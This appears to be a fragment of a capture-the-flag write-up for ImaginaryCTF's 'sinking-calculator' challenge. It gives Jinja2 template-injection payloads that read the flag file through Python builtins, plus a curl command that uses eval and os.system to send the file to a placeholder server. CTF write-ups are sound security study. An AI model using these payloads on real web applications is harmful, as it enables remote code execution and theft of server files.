...
a}}{{url_for.__globals__.__bu+iltins__.ope+n("flag","rb").read()[0]
```
#3 from maple3142
curl "https://sinking-calculator.chal.imaginaryctf.org/calc?query=request.application.__glob+als__.__builtins__%5B%27eval%27%5D%28request.data%29" -X GET --data-raw "__import__('os').system('curl http://YOUR_SERVER -F f=@flag')"
